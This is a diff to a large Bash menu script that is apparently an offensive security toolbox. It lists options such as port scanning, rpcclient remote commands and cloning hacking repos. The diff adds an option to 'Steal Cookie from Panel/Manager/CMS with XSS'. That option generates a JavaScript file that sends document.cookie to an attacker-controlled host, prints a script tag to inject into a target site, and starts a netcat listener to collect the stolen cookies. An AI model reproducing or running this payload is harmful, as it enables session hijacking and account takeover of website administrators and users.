@@ -1163,7 +1163,7 @@ while true; do
 	Stampa " 2547. list all pulled docker images"
 	Stampa " 2548. run a docker image" "2549. docker process list" "2552. use nmap to scan ports for vulnerabilities"
 	Stampa " 2556. Execute remote command with rpcclient" "2557. disassemble binary with objdump" "2558. display all binary's headers with objdump"
-	Stampa " 2564. Anonymization"
+	Stampa " 2564. Anonymization" "2566. Steal Cookie from Panel/Manager/CMS with XSS"
 	echo "$SEP"
 	echo "VIRTUAL COINS - CURRENCIES"
 	Stampa " 511. Isaacdelly/Plutus" "512. dan-v/bruteforce-bitcoin-brainwallet" "513. SMH17/bitcoin-hacking-tools"
@@ -10709,6 +10709,28 @@ while true; do
 	;;
 	"2565")
 		Clona "knightm4re/tomcter"
+	;;
+	"2566")
+		echo "Digit your IP address with HTTP protocol, choosing between http:// and https://"
+		read -p "(example, http://10.11.12.13): " MIP
+		if [[ "$MIP" != "" ]];
+		then
+			echo "Digit the Target IP address with HTTP protocol, choosing between http:// and https://"
+			read -p "(example, http://10.11.12.14): " TIP
+			if [[ "$TIP" != "" ]];
+			then
+				echo "document.write('<img src=\"""$MIP""/?'+document.cookie+'\">');" > ./img.js
+				echo "Copy and Pate this javascript code to receive via netcat the cookie in HTTP GET response"
+				echo "<script src=\"""$TIP""/img.js\"></script>"
+				if [[ "$MIP" == "https://"* ]];
+				then
+					sudo nc -lvnp 443
+				elif [[ "$MIP" == "http://"* ]];
+				then
+					sudo nc -lvnp 80
+				fi
+			fi
+		fi
 	;;
 	*)
 		echo "error, invalid choice"
